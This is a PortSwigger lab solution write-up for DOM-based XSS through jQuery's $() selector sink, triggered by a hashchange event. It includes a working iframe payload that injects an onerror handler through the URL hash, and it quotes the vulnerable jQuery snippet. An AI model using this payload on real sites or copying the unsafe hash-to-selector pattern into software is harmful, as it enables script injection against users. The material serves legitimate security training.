### Portswigger - Lab: DOM XSS in jQuery selector sink using a hashchange event

## Description 
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.
To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
## Soulution
Notice the vulnerable code on the home page using Burp or the browser's DevTools.
From the lab banner, open the exploit server.
In the Body section, add the following malicious iframe:
Payload:
```javascript
<iframe src="https://0a4a00c1036a6096c3314261005d00ff.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
Then click deliver exploit

## vulnerable code
```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```


